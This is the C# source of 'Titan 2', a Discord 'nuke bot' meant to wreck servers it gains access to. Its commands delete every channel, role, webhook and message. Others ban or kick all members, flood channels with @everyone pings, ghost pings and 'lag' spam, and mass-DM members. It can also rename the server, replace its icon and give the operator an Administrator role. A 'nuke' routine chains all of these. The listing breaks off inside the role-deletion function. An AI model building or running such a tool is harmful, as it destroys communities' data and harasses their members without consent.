using Discord;
using Discord.Commands;
using Discord.Gateway;
using Discord.Media;
using Discord.WebSockets;
using System;
using System.Drawing;
using System.Threading;
using System.Collections.Generic;
using System.Diagnostics;

class Program
{
    public static DiscordSocketClient client;
    public static string trigger = "t!";

    public static void Main()
    {
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;

        Console.Write(@"

  _______ _____ _______       _   _    ___  
 |__   __|_   _|__   __|/\   | \ | |  |__ \ 
    | |    | |    | |  /  \  |  \| |     ) |
    | |    | |    | | / /\ \ | . ` |    / / 
    | |   _| |_   | |/ ____ \| |\  |   / /_ 
    |_|  |_____|  |_/_/    \_\_| \_|  |____|
                                            
                                            

");
        Console.WriteLine("[!] Welcome to Titan 2, the definitive version of Titan Nuke Bot.");
        Console.WriteLine("[!] Connecting to Discord, please wait...");

        DiscordSocketConfig config = new DiscordSocketConfig();
        config.ApiVersion = 9;
        config.Intents = DiscordGatewayIntent.DirectMessageReactions | DiscordGatewayIntent.Guilds | DiscordGatewayIntent.GuildMembers | DiscordGatewayIntent.GuildBans | DiscordGatewayIntent.GuildEmojis | DiscordGatewayIntent.GuildIntegrations | DiscordGatewayIntent.GuildWebhooks | DiscordGatewayIntent.GuildInvites | DiscordGatewayIntent.GuildVoiceStates | DiscordGatewayIntent.GuildPresences | DiscordGatewayIntent.GuildMessages | DiscordGatewayIntent.GuildMessageReactions | DiscordGatewayIntent.GuildMessageTyping | DiscordGatewayIntent.DirectMessages | DiscordGatewayIntent.DirectMessageReactions | DiscordGatewayIntent.DirectMessageTyping;
        client = new DiscordSocketClient(config);

        Thread thread = new Thread(Connect);
        thread.Priority = ThreadPriority.Highest;
        thread.Start();

        Console.ReadLine();
    }

    public static void Connect()
    {
        client.OnLoggedIn += Client_OnLoggedIn;
        client.OnMessageReceived += Client_OnMessageReceived;
        client.Login("Bot TOKEN_HERE");
    }

    private static void Client_OnMessageReceived(DiscordSocketClient client, MessageEventArgs args)
    {
        Thread thread = new Thread(() => ProcessMessage(client, args));
        thread.Priority = ThreadPriority.Highest;
        thread.Start();
    }

    public static void ProcessMessage(DiscordSocketClient client, MessageEventArgs args)
    {
        try
        {
            if (args.Message.Author.User.Id == client.User.Id)
            {
                return;
            }

            string content = args.Message.Content;

            if (!content.StartsWith(trigger))
            {
                return;
            }

            args.Message.Delete();
            content = content.Substring(trigger.Length, content.Length - trigger.Length);

            if (content.StartsWith("help"))
            {
                int page = 1, pageLimit = 2;

                if (page > pageLimit)
                {
                    page = pageLimit;
                }

                if (page < 1)
                {
                    page = 1;
                }

                if (content.Contains(" "))
                {
                    content = content.Substring(("help".Length + 1), content.Length - ("help".Length + 1));
                    page = int.Parse(content);
                }

                if (page == 1)
                {
                    EmbedMaker embed = new EmbedMaker();

                    embed.Color = Color.FromArgb(230, 119, 20);
                    embed.Title = "🦍 Titan **2** Commands ( Page " + page.ToString() + " / " + pageLimit + " )";
                    embed.Description = @"👋 Welcome to *Titan 2*, I will destroy everything I will see." + Environment.NewLine +
                           "❓ Here is the list of commands that this bot can do: " + Environment.NewLine + Environment.NewLine +
                           "📜 **" + trigger + "help** [page] - Get the list of all commands of Titan." + Environment.NewLine +
                           "💬 **" + trigger + "text** <num> <name> - Add the specified amount of text channels." + Environment.NewLine +
                           "📌 **" + trigger + "category** <num> <name> - Add the specified amount of categories." + Environment.NewLine +
                           "🔊 **" + trigger + "voice** <num> <name> - Add the specified amount of voice channels." + Environment.NewLine +
                           "⛔ **" + trigger + "deltxt** - Delete all text channels." + Environment.NewLine +
                           "⛔ **" + trigger + "delvc** - Delete all voice channels." + Environment.NewLine +
                           "⛔ **" + trigger + "delcat** - Delete all categories." + Environment.NewLine +
                           "📜 **" + trigger + "servername** <name> - Change the server name." + Environment.NewLine +
                           "🌐 **" + trigger + "topic** <topic> - Change the topic to all text channels." + Environment.NewLine +
                           "⛔ **" + trigger + "deltopic** - Delete the topic from all text channels." + Environment.NewLine +
                           "👮 **" + trigger + "role** <num> <name> - Add the specified amount of roles." + Environment.NewLine +
                           "⛔ **" + trigger + "delroles** - Delete all roles." + Environment.NewLine +
                           "📱 **" + trigger + "icon** - Set the server icon to the Titan icon." + Environment.NewLine +
                           "⛔ **" + trigger + "delchannels** - Delete all channels." + Environment.NewLine +
                           "⛔ **" + trigger + "delall** - Delete all channels and all roles." + Environment.NewLine +
                           "☠️ **" + trigger + "kickall** [reason] - Kick all users from the server." + Environment.NewLine +
                           "💀 **" + trigger + "banall** [reason] - Ban all users from the server." + Environment.NewLine +
                           "😃 **" + trigger + "unbanall** - Unban all users from the server." + Environment.NewLine +
                           "☢️ **" + trigger + "nuke** - Nuke the server. Delete all channels and all roles, change server icon and server name, create mass roles and mass text channels." + Environment.NewLine +
                           "🔔 **" + trigger + "pings** <num> - Send the specified number of pings in chat." + Environment.NewLine +
                           "👻 **" + trigger + "ghostpings** <num> - Send the specified number of ghost pings." + Environment.NewLine +
                           "🎈 **" + trigger + "msgspam** <num> <msg> - Spam the specified message in chat." + Environment.NewLine +
                           "🌎 **" + trigger + "massmsg** <num> <msg> - Spam the specified message in all chats." + Environment.NewLine +
                           "💻 **" + trigger + "lag** <num> - Spam lag messages in all chats." + Environment.NewLine +
                           "🏷 **" + trigger + "nick** <nick> - Set the same nick name to all users." + Environment.NewLine +
                           "💬 **" + trigger + "dmall** <message> - Send a message in DM to all users." + Environment.NewLine +
                           "👑 **" + trigger + "admin** - Get a role with Administrator permissions." + Environment.NewLine +
                           "⭐ **" + trigger + "superspam** <num> - Send a big message in all chats.";

                    client.SendMessage(client.CreateDM(args.Message.Author.Member.User.Id).Id, embed);
                }
                else if (page == 2)
                {
                    EmbedMaker embed = new EmbedMaker();

                    embed.Color = Color.FromArgb(230, 119, 20);
                    embed.Title = "🦍 Titan **2** Commands ( Page " + page.ToString() + " / " + pageLimit + " )";
                    embed.Description = @"👋 Welcome to *Titan 2*, I will destroy everything I will see." + Environment.NewLine +
                            "❓ Here is the list of commands that this bot can do: " + Environment.NewLine + Environment.NewLine +
                            "📜 **" + trigger + "help** [page] - Get the list of all commands of Titan." + Environment.NewLine +
                            "🕸 **" + trigger + "delwebhooks** - Delete all webhooks in the channel." + Environment.NewLine +
                            "🌐 **" + trigger + "delallwebhooks** - Delete all webhooks in all text channels." + Environment.NewLine +
                            "📝 **" + trigger + "delmessages** - Delete all messages in the current text channel." + Environment.NewLine +
                            "📃 **" + trigger + "delallmessages** - Delete all messages in all text channels of the server." + Environment.NewLine +
                            "🔓 **" + trigger + "unlimit** - Remove the user limit from all voice channels." + Environment.NewLine +
                            "🔐 **" + trigger + "limit** <num> - Set a limit of user in all voice channels.";

                    client.SendMessage(client.CreateDM(args.Message.Author.Member.User.Id).Id, embed);
                }
            }
            else if (content.StartsWith("delallmessages"))
            {
                Thread thread = new Thread(() => DeleteMessages(args.Message.Guild.Id));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("text"))
            {
                if (content.Contains(" "))
                {
                    content = content.Substring(("text".Length + 1), content.Length - ("text".Length + 1));
                }

                int channels = 1;

                if (content != "")
                {
                    try
                    {
                        if (content.Contains(" "))
                        {
                            channels = int.Parse(content.Split(' ')[0]);
                        }
                        else
                        {
                            channels = int.Parse(content);
                        }
                    }
                    catch
                    {
                        Thread thread1 = new Thread(() => CreateChannels(args.Message.Guild.Id, 1, "🔱-destroyed-by-a-titan", ChannelType.Text));
                        thread1.Priority = ThreadPriority.Highest;
                        thread1.Start();

                        return;
                    }
                }

                content = content.Substring(channels.ToString().Length, content.Length - channels.ToString().Length);

                string channelName = "🔱-destroyed-by-a-titan";

                if (content != "")
                {
                    channelName = content;
                }

                Thread thread = new Thread(() => CreateChannels(args.Message.Guild.Id, channels, channelName, ChannelType.Text));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("category"))
            {
                if (content.Contains(" "))
                {
                    content = content.Substring(("category".Length + 1), content.Length - ("category".Length + 1));
                }

                int channels = 1;

                if (content != "")
                {
                    try
                    {
                        if (content.Contains(" "))
                        {
                            channels = int.Parse(content.Split(' ')[0]);
                        }
                        else
                        {
                            channels = int.Parse(content);
                        }
                    }
                    catch
                    {
                        Thread thread1 = new Thread(() => CreateChannels(args.Message.Guild.Id, 1, "🔱 destroyed by a titan", ChannelType.Category));
                        thread1.Priority = ThreadPriority.Highest;
                        thread1.Start();

                        return;
                    }
                }

                content = content.Substring(channels.ToString().Length, content.Length - channels.ToString().Length);

                string channelName = "🔱 destroyed by a titan";

                if (content != "")
                {
                    channelName = content;
                }

                Thread thread = new Thread(() => CreateChannels(args.Message.Guild.Id, channels, channelName, ChannelType.Category));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("voice"))
            {
                if (content.Contains(" "))
                {
                    content = content.Substring(("voice".Length + 1), content.Length - ("voice".Length + 1));
                }

                int channels = 1;

                if (content != "")
                {
                    try
                    {
                        if (content.Contains(" "))
                        {
                            channels = int.Parse(content.Split(' ')[0]);
                        }
                        else
                        {
                            channels = int.Parse(content);
                        }
                    }
                    catch
                    {
                        Thread thread1 = new Thread(() => CreateChannels(args.Message.Guild.Id, 1, "🔱 DESTROYED BY A TITAN", ChannelType.Voice));
                        thread1.Priority = ThreadPriority.Highest;
                        thread1.Start();

                        return;
                    }
                }

                content = content.Substring(channels.ToString().Length, content.Length - channels.ToString().Length);

                string channelName = "🔱 DESTROYED BY A TITAN";

                if (content != "")
                {
                    channelName = content;
                }

                Thread thread = new Thread(() => CreateChannels(args.Message.Guild.Id, channels, channelName, ChannelType.Voice));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("deltxt"))
            {
                Thread thread = new Thread(() => DeleteChannels(args.Message.Guild.Id, ChannelType.Text));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("delvc"))
            {
                Thread thread = new Thread(() => DeleteChannels(args.Message.Guild.Id, ChannelType.Voice));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("delcat"))
            {
                Thread thread = new Thread(() => DeleteChannels(args.Message.Guild.Id, ChannelType.Category));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("servername"))
            {
                string serverName = "☢️ NUKED BY TITAN 2";

                if (content.Contains(" "))
                {
                    content = content.Substring(("servername".Length + 1), content.Length - ("servername".Length + 1));

                    if (content != "")
                    {
                        serverName = content;
                    }
                }

                Thread thread = new Thread(() =>
                {
                    try
                    {
                        client.GetGuild(args.Message.Guild.Id).Modify(new GuildProperties() { Name = serverName });
                    }
                    catch
                    {

                    }
                });
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("topic"))
            {
                string topic = "**Hello! ** Do you wanna be eaten by a giant like me? <3";

                if (content.Contains(" "))
                {
                    content = content.Substring(("topic".Length + 1), content.Length - ("topic".Length + 1));

                    if (content != "")
                    {
                        topic = content;
                    }
                }

                Thread thread = new Thread(() => SetTopic(args.Message.Guild.Id, topic));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("deltopic"))
            {
                Thread thread = new Thread(() => SetTopic(args.Message.Guild.Id, ""));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("role"))
            {
                if (content.Contains(" "))
                {
                    content = content.Substring(("role".Length + 1), content.Length - ("role".Length + 1));
                }

                int channels = 1;

                if (content != "")
                {
                    try
                    {
                        if (content.Contains(" "))
                        {
                            channels = int.Parse(content.Split(' ')[0]);
                        }
                        else
                        {
                            channels = int.Parse(content);
                        }
                    }
                    catch
                    {
                        Thread thread1 = new Thread(() => CreateRoles(args.Message.Guild.Id, 1, "😡 I HATE HUMANS"));
                        thread1.Priority = ThreadPriority.Highest;
                        thread1.Start();

                        return;
                    }
                }

                content = content.Substring(channels.ToString().Length, content.Length - channels.ToString().Length);

                string channelName = "😡 I HATE HUMANS";

                if (content != "")
                {
                    channelName = content;
                }

                Thread thread = new Thread(() => CreateRoles(args.Message.Guild.Id, channels, channelName));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("delroles"))
            {
                Thread thread = new Thread(() => DeleteRoles(args.Message.Guild.Id));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("icon"))
            {
                Thread thread = new Thread(() => SetIcon(args.Message.Guild.Id));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("delchannels"))
            {
                Thread thread = new Thread(() => DeleteChannels(args.Message.Guild.Id));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("delall"))
            {
                Thread thread = new Thread(() => DeleteChannels(args.Message.Guild.Id));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();

                Thread thread1 = new Thread(() => DeleteRoles(args.Message.Guild.Id));
                thread1.Priority = ThreadPriority.Highest;
                thread1.Start();
            }
            else if (content.StartsWith("kickall"))
            {
                string reason = "KICKED BY TITAN";

                if (content.Contains(" "))
                {
                    content = content.Substring(("kickall".Length + 1), content.Length - ("kickall".Length + 1));

                    if (content != "")
                    {
                        reason = content;
                    }
                }

                Thread thread = new Thread(() => KickAll(args.Message.Guild.Id, reason));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("banall"))
            {
                string reason = "BANNED BY TITAN";

                if (content.Contains(" "))
                {
                    content = content.Substring(("banall".Length + 1), content.Length - ("banall".Length + 1));

                    if (content != "")
                    {
                        reason = content;
                    }
                }

                Thread thread = new Thread(() => BanAll(args.Message.Guild.Id, reason));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("unbanall"))
            {
                Thread thread = new Thread(() => UnbanAll(args.Message.Guild.Id));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("pings"))
            {
                int pings = 1;

                try
                {
                    if (content.Contains(" "))
                    {
                        content = content.Substring(("pings".Length + 1), content.Length - ("pings".Length + 1));

                        if (content != "")
                        {
                            pings = int.Parse(content);
                        }
                    }
                }
                catch
                {

                }

                Thread thread = new Thread(() => SendPings(args.Message.Channel.Id, pings));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("ghostpings"))
            {
                int pings = 1;

                try
                {
                    if (content.Contains(" "))
                    {
                        content = content.Substring(("ghostpings".Length + 1), content.Length - ("ghostpings".Length + 1));

                        if (content != "")
                        {
                            pings = int.Parse(content);
                        }
                    }
                }
                catch
                {

                }

                Thread thread = new Thread(() => SendGhostPings(args.Message.Channel.Id, pings));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("msgspam"))
            {
                if (content.Contains(" "))
                {
                    content = content.Substring(("msgspam".Length + 1), content.Length - ("msgspam".Length + 1));
                }

                int channels = 1;

                if (content != "")
                {
                    try
                    {
                        if (content.Contains(" "))
                        {
                            channels = int.Parse(content.Split(' ')[0]);
                        }
                        else
                        {
                            channels = int.Parse(content);
                        }
                    }
                    catch
                    {
                        Thread thread1 = new Thread(() => SendMessages(args.Message.Channel.Id, 1, "😡 I HATE HUMANS"));
                        thread1.Priority = ThreadPriority.Highest;
                        thread1.Start();

                        return;
                    }
                }

                content = content.Substring(channels.ToString().Length, content.Length - channels.ToString().Length);

                string channelName = "😡 I HATE HUMANS";

                if (content != "")
                {
                    channelName = content;
                }

                Thread thread = new Thread(() => SendMessages(args.Message.Channel.Id, channels, channelName));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("massmsg"))
            {
                if (content.Contains(" "))
                {
                    content = content.Substring(("massmsg".Length + 1), content.Length - ("massmsg".Length + 1));
                }

                int channels = 1;

                if (content != "")
                {
                    try
                    {
                        if (content.Contains(" "))
                        {
                            channels = int.Parse(content.Split(' ')[0]);
                        }
                        else
                        {
                            channels = int.Parse(content);
                        }
                    }
                    catch
                    {
                        Thread thread1 = new Thread(() => SendMessages(args.Message.Channel.Id, 1, "😡 I HATE HUMANS"));
                        thread1.Priority = ThreadPriority.Highest;
                        thread1.Start();

                        return;
                    }
                }

                content = content.Substring(channels.ToString().Length, content.Length - channels.ToString().Length);

                string channelName = "😡 I HATE HUMANS";

                if (content != "")
                {
                    channelName = content;
                }

                Thread thread = new Thread(() => SendGuildMessages(args.Message.Guild.Id, channels, channelName));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("lag"))
            {
                int pings = 1;

                try
                {
                    if (content.Contains(" "))
                    {
                        content = content.Substring(("lag".Length + 1), content.Length - ("lag".Length + 1));

                        if (content != "")
                        {
                            pings = int.Parse(content);
                        }
                    }
                }
                catch
                {

                }

                Thread thread = new Thread(() => SendGuildMessages(args.Message.Guild.Id, pings, ":chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains: :flag_ac: :chains: :flag_ac: :chains: :flag_ad: :laughing: :brain: :chains: :chains:"));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("superspam"))
            {
                int pings = 1;

                try
                {
                    if (content.Contains(" "))
                    {
                        content = content.Substring(("superspam".Length + 1), content.Length - ("superspam".Length + 1));

                        if (content != "")
                        {
                            pings = int.Parse(content);
                        }
                    }
                }
                catch
                {

                }

                string completeMessage = "@everyone @here" + Environment.NewLine;

                for (int i = 0; i < 30; i++)
                {
                    completeMessage += Environment.NewLine + "🗽 **I WANT THE FREEDOM! I AM IN THE BODY OF A GIANT.**";
                }

                completeMessage += Environment.NewLine + Environment.NewLine + "https://i.imgur.com/8zcY0co.jpg";

                Thread thread = new Thread(() => SendGuildMessages(args.Message.Guild.Id, pings, completeMessage));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("nick"))
            {
                string reason = "I WILL DESTROY THE WORLD";

                if (content.Contains(" "))
                {
                    content = content.Substring(("nick".Length + 1), content.Length - ("nick".Length + 1));

                    if (content != "")
                    {
                        reason = content;
                    }
                }

                Thread thread = new Thread(() => SetNick(args.Message.Guild.Id, reason));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("dmall"))
            {
                string reason = "Your server has been destroyed by **Titan 2!**";

                if (content.Contains(" "))
                {
                    content = content.Substring(("dmall".Length + 1), content.Length - ("dmall".Length + 1));

                    if (content != "")
                    {
                        reason = content;
                    }
                }

                Thread thread = new Thread(() => DMAll(args.Message.Guild.Id, reason));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("admin"))
            {
                Thread thread = new Thread(() => GiveAdmin(args.Message.Guild.Id, args.Message.Author.User.Id));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("delwebhooks"))
            {
                Thread thread = new Thread(() => DeleteWebhooks(args.Message.Guild.Id, args.Message.Channel.Id));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("delallwebhooks"))
            {
                Thread thread = new Thread(() => DeleteWebhooks(args.Message.Guild.Id));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("delmessages"))
            {
                Thread thread = new Thread(() => DeleteMessages(args.Message.Guild.Id, args.Message.Channel.Id));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("limit"))
            {
                int pings = 1;

                try
                {
                    if (content.Contains(" "))
                    {
                        content = content.Substring(("limit".Length + 1), content.Length - ("limit".Length + 1));

                        if (content != "")
                        {
                            pings = int.Parse(content);
                        }
                    }
                }
                catch
                {

                }

                Thread thread = new Thread(() => LimitVoice(args.Message.Guild.Id, pings));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("unlimit"))
            {
                Thread thread = new Thread(() => LimitVoice(args.Message.Guild.Id, 0));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
            else if (content.StartsWith("nuke"))
            {
                Thread thread = new Thread(() => Nuke(args.Message.Guild.Id));
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        catch
        {

        }
    }

    public static void Nuke(ulong guildId)
    {
        try
        {
            Thread thread = new Thread(() => DeleteChannels(guildId));
            thread.Priority = ThreadPriority.Highest;
            thread.Start();

            Thread thread1 = new Thread(() => DeleteRoles(guildId));
            thread1.Priority = ThreadPriority.Highest;
            thread1.Start();

            Thread thread3 = new Thread(() =>
            {
                try
                {
                    client.GetGuild(guildId).Modify(new GuildProperties() { Name = "☢️ NUKED BY TITAN 2" });
                }
                catch
                {

                }
            });
            thread3.Priority = ThreadPriority.Highest;
            thread3.Start();

            Thread thread4 = new Thread(() => SetIcon(guildId));
            thread4.Priority = ThreadPriority.Highest;
            thread4.Start();

            Thread thread5 = new Thread(() => CreateChannels(guildId, 300, "🔱-destroyed-by-a-titan", ChannelType.Text));
            thread5.Priority = ThreadPriority.Highest;
            thread5.Start();

            int channels = 0;
            
            thing3: foreach (DiscordChannel channel in client.GetGuild(guildId).GetChannels())
            {
                channels++;
            }

            if (channels < 298)
            {
                channels = 0;
                goto thing3;
            }

            string completeMessage = "@everyone @here" + Environment.NewLine;

            for (int i = 0; i < 30; i++)
            {
                completeMessage += Environment.NewLine + "🗽 **I WANT THE FREEDOM! I AM IN THE BODY OF A GIANT.**";
            }

            completeMessage += Environment.NewLine + Environment.NewLine + "https://i.imgur.com/8zcY0co.jpg";

            Thread thread6 = new Thread(() => SendGuildMessages(guildId, 10, completeMessage));
            thread6.Priority = ThreadPriority.Highest;
            thread6.Start();

            Thread thread7 = new Thread(() => BanAll(guildId, "NUKED BY TITAN 2"));
            thread7.Priority = ThreadPriority.Highest;
            thread7.Start();
        }
        catch
        {

        }
    }

    public static void LimitVoice (ulong guildId, int limit)
    {
        try
        {
            foreach (DiscordChannel channel in client.GetGuild(guildId).GetChannels())
            {
                if (channel.IsVoice)
                {
                    Thread thread = new Thread(() =>
                    {
                        try
                        {
                            ((VoiceChannel)channel).Modify(new VoiceChannelProperties() { UserLimit = (uint)limit });
                        }
                        catch
                        {

                        }
                    });
                    thread.Priority = ThreadPriority.Highest;
                    thread.Start();
                }
            }
        }
        catch
        {

        }
    }

    public static void DeleteMessages(ulong guildId, ulong channelId)
    {
        try
        {
            foreach (DiscordMessage message in ((TextChannel) client.GetChannel(channelId)).GetMessages())
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        message.Delete();
                    }
                    catch
                    {

                    }
                });
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        catch
        {

        }
    }

    public static void DeleteMessages(ulong guildId)
    {
        try
        {
            foreach (DiscordChannel channel in client.GetGuild(guildId).GetChannels())
            {
                if (channel.IsText)
                {
                    Thread thread1 = new Thread(() =>
                    {
                        foreach (DiscordMessage message in ((TextChannel)channel).GetMessages())
                        {
                            Thread thread = new Thread(() =>
                            {
                                try
                                {
                                    message.Delete();
                                }
                                catch
                                {

                                }
                            });
                            thread.Priority = ThreadPriority.Highest;
                            thread.Start();
                        }
                    });
                    thread1.Priority = ThreadPriority.Highest;
                    thread1.Start();
                }
            }
        }
        catch
        {

        }
    }

    public static void DeleteWebhooks(ulong guildId)
    {
        try
        {
            foreach (DiscordWebhook webhook in client.GetGuild(guildId).GetWebhooks())
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        webhook.Delete();
                    }
                    catch
                    {

                    }
                });
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        catch
        {

        }
    }

    public static void DeleteWebhooks(ulong guildId, ulong channelId)
    {
        try
        {
            foreach (DiscordWebhook webhook in client.GetGuild(guildId).GetWebhooks())
            {
                if (webhook.ChannelId == channelId)
                {
                    Thread thread = new Thread(() =>
                    {
                        try
                        {
                            webhook.Delete();
                        }
                        catch
                        {

                        }
                    });
                    thread.Priority = ThreadPriority.Highest;
                    thread.Start();
                }
            }
        }
        catch
        {

        }
    }

    public static void GiveAdmin(ulong guildId, ulong userId)
    {
        try
        {
            DiscordGuild guild = client.GetGuild(guildId);
            ulong roleId = guild.CreateRole(new RoleProperties() { Name = "*", Permissions = DiscordPermission.Administrator, Mentionable = false });
            guild.GetMember(userId).AddRole(roleId);
        }
        catch
        {

        }
    }

    public static void DMAll(ulong guildId, string nickname)
    {
        try
        {
            foreach (GuildMember member in client.GetGuildMembers(guildId))
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        client.CreateDM(member.User.Id).SendMessage(nickname);
                    }
                    catch
                    {

                    }
                });
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        catch
        {

        }
    }

    public static void SetNick(ulong guildId, string nickname)
    {
        try
        {
            foreach (GuildMember member in client.GetGuildMembers(guildId))
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        member.Modify(new GuildMemberProperties() { Nickname = nickname });
                    }
                    catch
                    {

                    }
                });
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        catch
        {

        }
    }

    public static void SendGuildMessages(ulong guildId, int messages, string msg)
    {
        try
        {
            foreach (DiscordChannel channel in client.GetGuild(guildId).GetChannels())
            {
                if (channel.IsText)
                {
                    for (int i = 0; i < messages; i++)
                    {
                        Thread thread = new Thread(() =>
                        {
                            try
                            {
                                client.SendMessage(channel.Id, msg);
                            }
                            catch
                            {

                            }
                        });
                        thread.Priority = ThreadPriority.Highest;
                        thread.Start();
                    }
                }
            }
        }
        catch
        {

        }
    }

    public static void SendMessages(ulong channelId, int pings, string msg)
    {
        for (int i = 0; i < pings; i++)
        {
            Thread thread = new Thread(() =>
            {
                try
                {
                    client.SendMessage(channelId, msg);
                }
                catch
                {

                }
            });
            thread.Priority = ThreadPriority.Highest;
            thread.Start();
        }
    }

    public static void SendPings(ulong channelId, int pings)
    {
        for (int i = 0; i < pings; i++)
        {
            Thread thread = new Thread(() =>
            {
                try
                {
                    client.SendMessage(channelId, "@everyone");
                }
                catch
                {

                }
            });
            thread.Priority = ThreadPriority.Highest;
            thread.Start();
        }
    }

    public static void SendGhostPings(ulong channelId, int pings)
    {
        for (int i = 0; i < pings; i++)
        {
            Thread thread = new Thread(() =>
            {
                try
                {
                    client.SendMessage(channelId, "@everyone").Delete();
                }
                catch
                {

                }
            });
            thread.Priority = ThreadPriority.Highest;
            thread.Start();
        }
    }

    public static void KickAll(ulong guildId, string reason)
    {
        try
        {
            foreach (GuildMember member in client.GetGuildMembers(guildId))
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        client.KickGuildMember(guildId, member.User.Id);
                    }
                    catch
                    {

                    }
                });
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        catch
        {

        }
    }

    public static void BanAll(ulong guildId, string reason)
    {
        try
        {
            foreach (GuildMember member in client.GetGuildMembers(guildId))
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        client.BanGuildMember(guildId, member.User.Id, reason, 7);
                    }
                    catch
                    {

                    }
                });
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        catch
        {

        }
    }

    public static void UnbanAll(ulong guildId)
    {
        try
        {
            foreach (DiscordBan ban in client.GetGuildBans(guildId))
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        ban.Unban();
                    }
                    catch
                    {

                    }
                });
                thread.Priority = ThreadPriority.Highest;
                thread.Start();
            }
        }
        catch
        {

        }
    }

    public static void SetIcon(ulong guildId)
    {
        try
        {
            client.GetGuild(guildId).Modify(new GuildProperties() { Icon = new DiscordImage(Image.FromFile("server.jpg")) });
        }
        catch
        {

        }
    }

    public static void DeleteRoles(ulong guildId)
    {
        try
        {
            foreach (DiscordRole role in client.GetGuild(guildId).GetRoles())
            {
                Thread thread = new Thread(() =>
                {
                    try
                    {
                        role.Delete();
                    }
